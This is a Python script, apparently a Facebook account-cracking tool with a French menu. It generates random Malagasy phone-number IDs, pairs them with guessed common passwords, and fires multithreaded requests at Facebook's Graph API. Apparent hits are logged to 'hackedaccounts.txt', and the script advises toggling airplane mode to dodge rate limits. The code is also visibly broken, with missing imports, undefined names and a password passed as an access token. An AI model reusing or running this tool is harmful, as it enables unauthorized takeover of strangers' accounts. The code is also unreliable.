import os
import random
import string
import uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import requests
from datetime import date, datetime

def menu_principal():
    print(logo)
    print("\x1b[38;5;155m➤  [1] CRACK MALAGASY ALÉATOIRE")
    print("\x1b[38;5;155m➤ [2]Envoyer un message au développeur❤️👾")
    print("\x1b[38;5;155m➤ [3]Groupe WhatsApp ❤️👾")
    print("\x1b[38;5;155m➤ [4]Groupe Facebook ❤️👾")
    print("\x1b[38;5;155m➤ [5]Compte ITACHI ❤️👾")
    print("\x1b[38;5;155m➤ [2] QUITTER L'OUTIL ")
    linex()
    choix = input("\x1b[38;5;155m[➤] VOTRE CHOIX : ")

    if choix == "1":
        bhoot()
    elif choix == "2":
        os.system('xdg-open https://chat.whatsapp.com/BXZgnNPv6VwHxyzVEjWBBR')
        input("Appuyez sur Entrée pour continuer...")
        menu_principal()
    elif choix == "3":
        os.system('xdg-open https://chat.whatsapp.com/Kcj4CIXEgEcCeHGJpxaFYB')
        input("Appuyez sur Entrée pour continuer...")
        menu_principal()
    elif choix == "4":
        os.system('xdg-open https://facebook.com/groups/641144864016773/')
        input("Appuyez sur Entrée pour continuer...")
        menu_principal()
    elif choix == "5":
        os.system('xdg-open https://www.facebook.com/DIEU.ITACHI999')
        input("Appuyez sur Entrée pour continuer...")
        menu_principal()
    elif choix == "6":
        os.system('exit')
    elif choix.lower() == "e":
        os.system('exit')
    else:
        print("Choix invalide. Veuillez sélectionner une option valide.")
        menu_principal()

def bhoot():
    user = []
    os.system("clear")
    print(logo)
    print("\x1b[38;5;155m[✧] CODE SIM : 26133,26132,26138,26134 ")
    code = input("\x1b[38;5;155m[➤] VOTRE CHOIX : ")
    os.system("clear")
    print(logo)
    print("\x1b[38;5;155m[✧] EXEMPLE DE LIMITE : 5000,10000,50000 ")
    limit = int(input('\x1b[38;5;155m[➤] VOTRE CHOIX : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=30) as TANIM:
        tl = str(len(user))
        print('\x1b[38;5;155m[➤] \x1b[38;5;222mUTILISEZ LE MODE AVION APRÈS 2 MINUTES POUR OBTENIR PLUS D\'IDS OK <>~~~')
        linex()
        for love in user:
            pwx = [love[2:], love, code + love, code + love[:3], 'bangladesh', 'free fire', 'je t\'aime', 'sadiya', 'mimmim', 'mababa', 'sarmin', 'riya123', 'yousha', 'sabbir', 'mehedi', 'tonmoy', 'ayesha', 'fuckyou', 'tammana', 'nishat', 'malala', 'mamako', 'Mamako', 'mamiko']
            ids = code + love
            TANIM.submit(api, ids, pwx, tl)
    print('TOTAL OK \033[1;92m' + str(len(oks)))

def api(ids, pwv, tl):
    global loop, oks, cps, twf
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] RECHERCHE DE ITACHI~  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ')
    sys.stdout.flush()
    try:
        for pas in pwv:
            data = requests.get(f'https://graph.facebook.com/{ids}/?access_token={pas}')
            z = json.loads(data.text)
            if 'username' in z.keys():
                print('\x1b[38;5;155m[✓] >> ' + ids + ' ✅ | ' + pas)
                ok = open('hackedaccounts.txt', 'a')
                ok.write(ids + ' | ' + pas + '\n')
                ok.close()
                oks.append(ids)
                break
            elif 'www.facebook.com' in z['error']['message']:
                print('\x1b[38;5;155m[✘] >> ' + ids + ' ⚠️ | ' + pas)
                break
            else:
                continue
    except:
        pass

menu_principal()
